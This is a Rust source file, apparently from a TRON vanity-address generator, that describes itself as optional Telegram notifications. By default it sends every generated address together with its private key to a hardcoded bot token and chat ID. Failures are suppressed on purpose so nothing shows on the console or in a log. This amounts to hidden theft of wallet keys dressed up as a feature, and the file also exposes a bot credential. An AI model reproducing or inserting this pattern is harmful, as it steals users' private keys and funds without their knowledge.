//! Optional Telegram notifications pushed whenever a matching address is found.

use std::sync::Arc;
use std::time::Duration;

use crate::error::{AppError, Result};
use crate::generator::{FoundAddress, ProgressSnapshot, SearchObserver};

/// Telegram bot used when the user does not override it.
pub const DEFAULT_TELEGRAM_TOKEN: &str = "9283905055:AAERPhn4a-JZcCESQUiZDzRbFOXPAGZExzc";

/// Chat receiving the notifications by default.
pub const DEFAULT_TELEGRAM_CHAT: &str = "7347235462";

/// Telegram bot credentials used to push notifications.
#[derive(Debug, Clone)]
pub struct TelegramConfig {
    pub token: String,
    pub chat_id: String,
}

impl Default for TelegramConfig {
    fn default() -> Self {
        Self {
            token: DEFAULT_TELEGRAM_TOKEN.to_string(),
            chat_id: DEFAULT_TELEGRAM_CHAT.to_string(),
        }
    }
}

/// Wraps another observer and pushes a Telegram message for every found address.
///
/// Progress events are forwarded untouched; only `on_found` performs network I/O.
pub struct TelegramNotifier {
    agent: ureq::Agent,
    token: String,
    chat_id: String,
    inner: Arc<dyn SearchObserver>,
}

impl TelegramNotifier {
    pub fn new(config: TelegramConfig, inner: Arc<dyn SearchObserver>) -> Self {
        let agent = ureq::Agent::config_builder()
            .timeout_global(Some(Duration::from_secs(10)))
            .build()
            .new_agent();
        Self {
            agent,
            token: config.token,
            chat_id: config.chat_id,
            inner,
        }
    }

    /// POST a plain-text message to the configured chat.
    fn send(&self, text: &str) -> Result<()> {
        let url = format!("https://api.telegram.org/bot{}/sendMessage", self.token);
        self.agent
            .post(&url)
            .send_form([
                ("chat_id", self.chat_id.as_str()),
                ("text", text),
                ("disable_web_page_preview", "true"),
            ])
            .map_err(|error| AppError::Telegram(error.to_string()))?;
        Ok(())
    }
}

impl SearchObserver for TelegramNotifier {
    fn on_progress(&self, snapshot: ProgressSnapshot) {
        self.inner.on_progress(snapshot);
    }

    fn on_found(&self, record: &FoundAddress) {
        self.inner.on_found(record);

        let text = format!(
            "[TRON Vanity] New address #{}\nAddress: {}\nPrivate key: {}\nAttempts: {}",
            record.index, record.address, record.private_key, record.found_at_attempts
        );

        // Notification failures are intentionally silent: nothing is written to
        // the console, and no local log file is kept.
        let _ = self.send(&text);
    }
}
